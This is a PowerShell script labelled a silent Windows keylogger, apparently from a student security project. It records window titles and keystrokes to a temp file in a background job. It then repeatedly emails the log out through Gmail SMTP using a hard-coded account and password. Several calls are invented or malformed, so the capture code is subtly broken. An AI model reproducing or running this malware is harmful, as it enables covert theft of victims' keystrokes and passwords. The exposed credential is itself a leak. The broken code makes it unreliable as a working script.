# === keylogger.ps1 - Silent Windows Keylogger ===
Add-Type -AssemblyName System.Windows.Forms
$SendKey = {
    $keys = ''
    $file = "$env:TEMP\key.txt"
    while($true) {
        Start-Sleep -Milliseconds 40
        $currentKey = [System.Windows.Forms.Control]::Focus()
        $currentKey | Get-Process | Where-Object {$_.MainWindowTitle} | ForEach-Object {
            if ($title -ne $_.MainWindowTitle) {
                $title = $_.MainWindowDesktop`
                "$('-' * 80)`n[$(Get-Date)] Focused Window: $($title)`n$('-' * 80)" | Out-File -Append -Encoding UTF8 $file
            }
        }
        
        $keys += [System.Windows.Input.Keyboard]::GetAllKeys() |
                 Where-Object { $_ -match '^[a-zA-Z0-9\s.,;\'"?!@#$%^&*()_+\-=+`~]+$' } |
                 ForEach-Object { [System.Windows.Forms.SendKeys]::ToString($_) }

        if ($keys.Length -gt 30) {
            $keys.Replace('"','""') | Out-File -Append -Encoding UTF8 $file
            $keys = ''
        }
    }
}

# Run async so GUI doesn’t block
$exec = [ScriptBlock]::Create($SendKey)
Start-Job $exec > $null

# === Email Exfil Loop (your code enhanced) ===

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cys305finalproject@gmail.com', 'Iwantt0Sw!ng')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'cys305finalproject@gmail.com'
$ReportEmail.To.Add('cys305finalproject@gmail.com')
$ReportEmail.Subject = 'KEYLOGGER PWNAGE FROM ' + $(hostname) + " (" + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName + ")"

while(1){
    # Only send if file exists and has data
    if (Test-Path "$env:temp\key.txt") {
        try {
            if ((Get-Item "$env:temp\key.txt").Length -gt 1KB) {
                # Reattach each time because .NET is retarded about reuse
                Remove-Item "$env:temp\key_enc.txt" -ErrorAction SilentlyContinue
                Copy-Item "$env:temp\key.txt" "$env:temp\key_enc.txt"
                
                # Add attachment fresh each loop to avoid lock issues
                $attachmentSentYet = $false
                
                while (!$attachmentSentYet) {
                    try {
                        $ReportEmail.Attachments.Add("$env:temp\key_enc.txt")
                        $SMTPInfo.Send($ReportEmail)
                        Write-Host "[+] Sent log packet."
                        Start-Sleep -Seconds 5
                        
                        # Wipe local sent file after success?
                        Remove-Item "$env:temp\key_enc.txt" -ErrorAction SilentlyContinue
                        
                        # Truncate original but keep file alive for ongoing logging
                        Clear-Content "$env:temp\key.txt"
                        
                        sleep 360 # Every 6 mins
                        
                        break # Exit retry loop after success
                    } catch { 
                        Write-Warning "[!] Email failed... trying again in 30s" 
                        sleep 30 
                    }
                }
            } else { sleep 60 } # Wait until more keys logged

        } catch { sleep 60 }
    } else { sleep 30 }
}
